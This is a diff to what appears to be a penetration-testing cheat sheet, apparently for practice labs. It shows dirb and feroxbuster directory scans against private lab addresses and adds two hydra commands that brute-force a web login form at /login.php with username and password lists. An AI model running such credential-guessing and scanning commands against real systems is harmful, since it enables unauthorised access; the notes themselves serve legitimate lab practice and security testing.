@@ -10,7 +10,13 @@ dirb http://10.129.1.15/ /usr/share/seclists/Discovery/Web-Content/directory-lis
 feroxbuster -u "http://10.8.0.222" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --no-recursion -t 100
 ```
 
+```
+hydra 10.129.1.15 -L allowed.userlist -P allowed.userlist.passwd http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Incorrect information" -V
+```
 
+```
+hydra 10.129.1.15 -L allowed.userlist -P allowed.userlist.passwd http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Incorrect"
+```
 
 ### Nmap 
 
